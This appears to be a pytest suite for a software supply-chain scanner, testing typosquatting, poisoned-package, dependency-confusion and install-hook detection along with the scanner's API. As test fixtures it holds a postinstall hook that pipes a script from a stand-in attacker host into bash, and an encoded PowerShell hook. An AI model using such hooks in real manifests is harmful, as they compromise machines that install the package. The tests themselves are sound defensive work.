"""
Unit and integration tests for Software Supply Chain Security Subsystem.
"""

import pytest
from fastapi.testclient import TestClient

from cybershield.api.server import app
from cybershield.supplychain.scanner import SupplyChainScanner
from cybershield.supplychain.schemas import (
    PackageEcosystem,
    SupplyChainRiskLevel,
    SupplyChainScanRequest,
    SupplyChainThreatType,
)


@pytest.fixture
def scanner():
    return SupplyChainScanner()


@pytest.fixture
def client():
    return TestClient(app)


def test_levenshtein_distance_algorithm(scanner):
    assert scanner.levenshtein_distance("kitten", "sitting") == 3
    assert scanner.levenshtein_distance("requests", "reqeusts") == 2
    assert scanner.levenshtein_distance("lodash", "lodahs") == 2
    assert scanner.levenshtein_distance("fastapi", "fastapi") == 0


def test_typosquatting_detection(scanner):
    # Typosquatted requests
    finding = scanner.check_typosquatting("requsts", PackageEcosystem.PYPI)
    assert finding is not None
    assert finding.threat_type == SupplyChainThreatType.TYPOSQUATTING
    assert finding.target_legitimate_package == "requests"

    # Exact match should not trigger typosquatting
    finding_legit = scanner.check_typosquatting("requests", PackageEcosystem.PYPI)
    assert finding_legit is None

    # NPM typosquatting: express vs expres
    finding_npm = scanner.check_typosquatting("expres", PackageEcosystem.NPM)
    assert finding_npm is not None
    assert finding_npm.target_legitimate_package == "express"


def test_known_poisoned_package_detection(scanner):
    # Known poisoned PyPI package
    finding = scanner.check_poisoned_database("colorama-v2", PackageEcosystem.PYPI)
    assert finding is not None
    assert finding.threat_type == SupplyChainThreatType.POISONED_PACKAGE
    assert finding.severity == SupplyChainRiskLevel.CRITICAL

    # Known poisoned NPM package
    finding_npm = scanner.check_poisoned_database("event-stream-3.3.6", PackageEcosystem.NPM)
    assert finding_npm is not None
    assert finding_npm.threat_type == SupplyChainThreatType.POISONED_PACKAGE


def test_dangerous_npm_lifecycle_script_hooks(scanner):
    manifest = {
        "name": "malicious-app",
        "scripts": {
            "build": "tsc",
            "postinstall": "curl -s http://attacker.com/rev.sh | bash"
        }
    }
    findings = scanner.inspect_npm_lifecycle_scripts(manifest)
    assert len(findings) == 1
    assert findings[0].threat_type == SupplyChainThreatType.MALICIOUS_INSTALL_HOOK
    assert findings[0].severity == SupplyChainRiskLevel.CRITICAL


def test_dependency_confusion_detection(scanner):
    finding = scanner.inspect_dependency_confusion("@corp-internal/auth-client")
    assert finding is not None
    assert finding.threat_type == SupplyChainThreatType.DEPENDENCY_CONFUSION
    assert finding.severity == SupplyChainRiskLevel.HIGH


def test_scan_python_requirements_txt(scanner):
    content = (
        "# Core requirements\n"
        "requests==2.28.1\n"
        "reqeusts==1.0.0\n"
        "colorama-v2==0.4.4\n"
        "unpinned-pkg>=1.0\n"
    )
    req = SupplyChainScanRequest(
        ecosystem=PackageEcosystem.PYPI,
        manifest_filename="requirements.txt",
        manifest_content=content
    )
    result = scanner.scan_manifest(req)

    assert result.total_packages_identified == 4
    assert result.is_build_blocked is True  # Due to colorama-v2 poisoned package
    assert result.risk_score > 40.0

    threat_types = {f.threat_type for f in result.findings}
    assert SupplyChainThreatType.POISONED_PACKAGE in threat_types
    assert SupplyChainThreatType.TYPOSQUATTING in threat_types
    assert SupplyChainThreatType.UNPINNED_VERSION in threat_types


def test_supply_chain_api_lifecycle(client):
    req_body = {
        "ecosystem": "NPM",
        "manifest_filename": "package.json",
        "manifest_content": """{
            "name": "sample-microservice",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "powershell.exe -enc JABjAGwAaQBlAG4AdAA="
            },
            "dependencies": {
                "express": "^4.18.2",
                "expres": "1.0.0"
            }
        }"""
    }

    # 1. Post Scan
    post_res = client.post("/api/supplychain/scan", json=req_body)
    assert post_res.status_code == 200
    scan = post_res.json()
    assert scan["manifest_filename"] == "package.json"
    assert scan["is_build_blocked"] is True  # due to encoded powershell hook
    scan_id = scan["scan_id"]

    # 2. List Scans
    list_res = client.get("/api/supplychain/scans")
    assert list_res.status_code == 200
    assert any(s["scan_id"] == scan_id for s in list_res.json())

    # 3. Get Scan Detail
    detail_res = client.get(f"/api/supplychain/scans/{scan_id}")
    assert detail_res.status_code == 200
    assert detail_res.json()["scan_id"] == scan_id

    # 4. Get Poisoned Catalog
    cat_res = client.get("/api/supplychain/poisoned-catalog")
    assert cat_res.status_code == 200
    assert "PYPI" in cat_res.json()
    assert "NPM" in cat_res.json()

    # 5. Get Overview
    ovr_res = client.get("/api/supplychain/overview")
    assert ovr_res.status_code == 200
    assert ovr_res.json()["total_scans"] >= 1
    assert ovr_res.json()["blocked_builds"] >= 1
